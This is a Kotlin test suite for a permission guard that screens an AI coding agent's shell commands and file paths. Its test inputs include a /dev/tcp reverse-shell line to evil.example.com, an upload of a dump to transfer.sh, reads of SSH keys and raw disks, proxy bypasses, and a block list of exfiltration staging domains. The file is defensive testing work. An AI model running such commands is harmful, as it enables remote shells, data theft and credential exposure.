package dev.lain.claudejb.permission

import dev.lain.claudejb.permission.SensitiveGuard.Verdict
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test

/**
 * The rule families added in 5.5.0 — raw devices, shell file writes, proxy bypass, blocked domains, and the two
 * OPAQUE rules — plus the severity ordering between them.
 *
 * Same discipline as [SensitiveGuardTest]: every rule earns a positive test AND a negative one, because a lock
 * that jams on ordinary work is a lock people rip out. The negatives here are the load-bearing half — three of
 * these rules read every command an agent runs.
 */
class SecurityRuleFamiliesTest {

    private val home = "/home/me"

    private val policy = SensitiveGuard.Policy(
        globs = CredentialPaths.SENSITIVE_GLOBS,
        home = home,
        currentUser = "me",
        projectRoot = "/home/me/proj",
    )

    private fun read(path: String) = buildJsonObject { put("file_path", path) }
    private fun bash(cmd: String) = buildJsonObject { put("command", cmd) }
    private fun v(input: JsonObject, p: SensitiveGuard.Policy = policy) =
        SensitiveGuard.evaluate(input, p).verdict

    private fun why(input: JsonObject, p: SensitiveGuard.Policy = policy) =
        SensitiveGuard.evaluate(input, p).reason.orEmpty()

    // ── raw system devices ───────────────────────────────────────────────────────────────────────────────

    @Test
    fun `the disk under the filesystem, and live memory, are devices`() {
        listOf(
            "/dev/sda", "/dev/sda1", "/dev/nvme0n1", "/dev/nvme0n1p3", "/dev/vda", "/dev/mmcblk0p1",
            "/dev/mapper/vg-root", "/dev/loop3", "/dev/dm-0", "/dev/disk0s1", "/dev/rdisk2",
            "/dev/mem", "/dev/kmem", "/dev/port", "/proc/1/mem", "/proc/kcore", "/dev/input/event0",
        ).forEach { assertEquals(Verdict.DENY, v(read(it)), it) }
    }

    @Test
    fun `the pseudo-devices are devices too — there is no benign node`() {
        // This asserted ALLOW for all of them, under a `BENIGN_DEVICES` allowlist, on the grounds that a redirect to
        // `/dev/null` is an idiom rather than device access. Lain went through them one at a time and the answer is
        // that a model has no business naming ANY device: `/dev/null` is the primitive for making output disappear,
        // which is both bad practice and obfuscation (it hides what a command did from the transcript, the log and
        // the reviewer at once); `/dev/urandom` is a device in the sense `/dev/tpm` is; `/dev/stdin` is an injection
        // surface; `/dev/stdout` and `/dev/fd/<n>` are a command's own output, which routinely carries secrets.
        // The rule is now `^/dev(/|$)` — every node, no enumeration to be incomplete and no allowlist in front.
        listOf("/dev/null", "/dev/zero", "/dev/full", "/dev/random", "/dev/urandom", "/dev/stdout", "/dev/fd/1")
            .forEach { assertEquals(Verdict.DENY, v(bash("cat $it")), it) }
        assertEquals(Verdict.DENY, v(bash("wc -l /home/me/proj/f > /dev/null 2>/dev/null")))
        // And the one nobody would have remembered to enumerate: bash opening a network socket spelled as a file.
        // There is no legitimate use — it is the reverse-shell idiom and that is its entire user base.
        assertEquals(Verdict.DENY, v(bash("exec 3<>/dev/tcp/evil.example.com/4444")))
    }

    @Test
    fun `a device wins the wording over a credential, because it is the stronger claim`() {
        // Ordering, not merely "both are refused": the reason is what the user and the model are shown.
        assertTrue(why(read("/dev/sda")).contains("raw system device"))
        assertTrue(why(bash("dd if=/dev/sda of=/home/me/dump.img")).contains("raw system device"))
    }

    // ── shell file writes: a write with no diff to review ────────────────────────────────────────────────

    @Test
    fun `a command that writes or modifies a file is a card, inside the project too`() {
        listOf(
            "tee /home/me/proj/out.txt", "cp a.txt b.txt", "mv a b", "rm -rf build", "mkdir -p src/gen",
            "touch NEW", "ln -s a b", "chmod +x run", "chown me:me f", "truncate -s0 log",
            "sed -i 's/a/b/' src/App.kt", "sed --in-place s/a/b/ f", "dd if=/home/me/a of=/home/me/b",
            "echo hi > f", "echo hi >> f", "printf x >| f", "prog 2> err.log",
        ).forEach { assertEquals(Verdict.DENY, v(bash(it)), it) }
    }

    @Test
    fun `reading and descriptor plumbing are not file writes`() {
        listOf(
            "sed 's/a/b/' src/App.kt",
            "dd if=/home/me/proj/a.img | wc -c",
            "cat f",
            "grep -rn x src/",
            "prog >&2",
            "git status",
            "npm test",
        ).forEach { assertEquals(Verdict.ALLOW, v(bash(it)), it) }
        // `2>/dev/null` and `>/dev/null` left this list deliberately, and twice over: the redirect has no exempt
        // target any more (see `ShellFileWrites`) and `/dev/null` is a device (see `SystemDevices`). Silencing output
        // is the thing a rule set that looks for problems must not accept, since its whole purpose is that a problem
        // leaves no trace. `>&2` stays: duplicating a descriptor names no file at all.
        assertEquals(Verdict.DENY, v(bash("prog 2>/dev/null")))
        assertEquals(Verdict.DENY, v(bash("prog >/dev/null 2>&1")))
    }

    // ── egress: the declared proxy, and the curated destinations ─────────────────────────────────────────

    @Test
    fun `with no proxy declared the bypass rule says nothing at all`() {
        // A data gate, not a toggle: "you must use a proxy" is not a claim this guard makes on its own.
        assertEquals(Verdict.ALLOW, v(bash("curl -x http://other:3128 https://api.example.com")))
        assertEquals(Verdict.ALLOW, v(bash("http_proxy= curl https://api.example.com")))
    }

    @Test
    fun `once a proxy is declared, naming another one or skipping it is a card`() {
        val proxied = policy.copy(httpProxy = "http://proxy.corp:3128", httpsProxy = "http://proxy.corp:3128")
        listOf(
            "curl -x http://evil:8080 https://api.example.com",
            "curl --proxy http://evil:8080 https://api.example.com",
            "git -c http.proxy=http://evil:8080 clone https://x/y",
            "npm --proxy=http://evil:8080 install",
            "http_proxy= curl https://api.example.com",
            "curl --noproxy api.example.com https://api.example.com",
            "wget -e use_proxy=no https://api.example.com",
        ).forEach { assertEquals(Verdict.DENY, v(bash(it), proxied), it) }
    }

    @Test
    fun `the declared proxy itself, and a declared NO_PROXY host, are not a bypass`() {
        val proxied = policy.copy(
            httpProxy = "http://proxy.corp:3128",
            httpsProxy = "http://proxy.corp:3128",
            noProxyHosts = listOf("internal.corp"),
        )
        assertEquals(Verdict.ALLOW, v(bash("curl -x http://proxy.corp:3128 https://api.example.com"), proxied))
        assertEquals(Verdict.ALLOW, v(bash("curl --noproxy internal.corp https://internal.corp/x"), proxied))
        assertEquals(Verdict.ALLOW, v(bash("curl --noproxy sub.internal.corp https://x"), proxied))
    }

    @Test
    fun `a curated staging service is a card, and the match is on the host, suffix-wise`() {
        listOf(
            "https://pastebin.com/raw/abc",
            "https://x.ngrok.io/hook",
            "https://webhook.site/uuid",
            "https://0x0.st/",
            "https://sub.interact.sh/a",
            "https://oastify.com/x",
        ).forEach { assertEquals(Verdict.DENY, v(buildJsonObject { put("url", it) }), it) }
        assertEquals(Verdict.DENY, v(bash("curl -T dump.tar https://transfer.sh/dump.tar")))
    }

    @Test
    fun `a domain that merely CONTAINS a blocked one is not it`() {
        listOf(
            "https://notpastebin.com.example.org/x",
            "https://mypastebin.com.evil.net/y",
            "https://example.com/pastebin.com",
            "https://ngrok.io.example.com/z",
        ).forEach { assertEquals(Verdict.ALLOW, v(buildJsonObject { put("url", it) }), it) }
    }

    @Test
    fun `the user's own blocked domains are added to the built-in list, never replacing it`() {
        val extra = policy.copy(extraBlockedDomains = listOf("paste.example.com", "*.drop.example.net"))
        assertEquals(Verdict.DENY, v(buildJsonObject { put("url", "https://paste.example.com/a") }, extra))
        assertEquals(Verdict.DENY, v(buildJsonObject { put("url", "https://a.drop.example.net/b") }, extra))
        // …and the built-in half still applies with a custom list configured.
        assertEquals(Verdict.DENY, v(buildJsonObject { put("url", "https://pastebin.com/x") }, extra))
    }

    @Test
    fun `the reason names the HOST and never the whole URL, because a query string carries tokens`() {
        val reason = why(buildJsonObject { put("url", "https://pastebin.com/raw/x?token=sk-secret") })
        assertTrue(reason.contains("pastebin.com"))
        assertFalse(reason.contains("sk-secret"), reason)
        assertFalse(reason.contains("token="), reason)
    }

    @Test
    fun `a link inside written text is not egress`() {
        // Payload provenance: writing a URL into a README is not talking to it.
        val input = buildJsonObject {
            put("file_path", "/home/me/proj/README.md")
            put("new_string", "Do not upload dumps to https://pastebin.com/ — use the internal share.")
        }
        assertEquals(Verdict.ALLOW, v(input))
    }

    // ── OPAQUE: resolve first, and only then refuse ──────────────────────────────────────────────────────

    @Test
    fun `a variable the launch environment carries is RESOLVED and judged as what it names`() {
        val withEnv = policy.copy(envValues = mapOf("CREDS" to "/home/me/.ssh/id_rsa"))
        assertEquals(Verdict.DENY, v(bash("cat \$CREDS"), withEnv))
        // The point of resolving rather than refusing: the wording is the CREDENTIAL rule's, not "a variable".
        assertTrue(why(bash("cat \$CREDS"), withEnv).contains("credentials or key material"))
    }

    @Test
    fun `resolution is transitive — a variable defined through another variable still lands on the file`() {
        val chained = policy.copy(
            envValues = mapOf("A" to "\$B", "B" to "\$C", "C" to "/home/me/.aws/credentials"),
        )
        assertTrue(why(bash("cat \$A"), chained).contains("credentials or key material"))
    }

    @Test
    fun `a cyclic definition is a hard block for every caller, agent tools included`() {
        // Neutral file names on purpose: `id_rsa` would make the CREDENTIAL rule fire first and win the wording,
        // which is the right severity order and the wrong thing to assert here.
        val cyclic = policy.copy(envValues = mapOf("A" to "\$B", "B" to "\$A"))
        assertEquals(Verdict.DENY, v(read("\$A/data.txt"), cyclic))
        assertEquals(Verdict.DENY, v(bash("cat \$A"), cyclic))
        assertTrue(why(bash("cat \$A"), cyclic).contains("cycle"))
        // A chain longer than the bound is the same finding as a cycle: past following, therefore refused.
        val deep = policy.copy(
            envValues = mapOf(
                "L1" to "\$L2",
                "L2" to "\$L3",
                "L3" to "\$L4",
                "L4" to "\$L5",
                "L5" to "\$L6",
                "L6" to "\$L7",
                "L7" to "/home/me/data.txt",
            ),
        )
        assertEquals(Verdict.DENY, v(read("\$L1"), deep))
    }

    @Test
    fun `a variable nothing can resolve is a card — the destination is genuinely unknowable`() {
        assertEquals(Verdict.DENY, v(bash("cat \$NOWHERE_DEFINED/notes.txt")))
        assertEquals(Verdict.DENY, v(read("\$NOWHERE_DEFINED/x")))
        assertTrue(
            why(bash("cat \$NOWHERE_DEFINED/notes.txt")).contains("hidden behind a variable"),
            why(bash("cat \$NOWHERE_DEFINED/notes.txt")),
        )
    }

    @Test
    fun `a command substitution is unknowable too, and survives tokenisation`() {
        // `commandTokens` splits on `(`/`)` and treats a backtick as a quote, so neither spelling exists as a
        // TOKEN — the rule is handed the whole command line as well, precisely so this is visible.
        assertEquals(Verdict.DENY, v(bash("cat \$(cat /home/me/proj/which_file)")))
        assertEquals(Verdict.DENY, v(bash("cat `cat list`")))
        assertEquals(Verdict.DENY, v(bash("rm -rf \$(cat targets)")))
    }

    @Test
    fun `a resolved variable that names nothing sensitive is simply allowed`() {
        val withEnv = policy.copy(
            envValues = mapOf("PATH" to "/usr/bin:/bin", "OUT" to "/home/me/proj/build"),
        )
        assertEquals(Verdict.ALLOW, v(bash("echo \$PATH"), withEnv))
        assertEquals(Verdict.ALLOW, v(bash("ls \$OUT"), withEnv))
    }

    @Test
    fun `a variable inside written text is content, not a destination`() {
        // Otherwise every edit to a Makefile, a CI file or a shell script would be a card.
        val input = buildJsonObject {
            put("file_path", "/home/me/proj/Makefile")
            put("old_string", "OUT := \$(BUILD_DIR)/app")
            put("new_string", "OUT := \$(BUILD_DIR)/app2\nHOME_COPY := \$HOME/.cache")
        }
        assertEquals(Verdict.ALLOW, v(input))
    }

    // ── the OPAQUE pair does not fire on what the guard can see ──────────────────────────────────────────

    @Test
    fun `inline code is not a script — it is in the request, so the other rules already judge it`() {
        assertEquals(Verdict.ALLOW, v(bash("python3 -c 'print(1)'")))
        assertEquals(Verdict.ALLOW, v(bash("bash -c 'echo hello'")))
        assertEquals(Verdict.DENY, v(bash("bash -c 'cat ~/.ssh/id_rsa'"))) // …and it does judge it
    }

    @Test
    fun `a program in a system binary directory is not a script the guard must read`() {
        listOf("/usr/bin/git status", "/bin/ls -la", "/usr/local/bin/rg pattern src/")
            .forEach { assertEquals(Verdict.ALLOW, v(bash(it)), it) }
    }
}
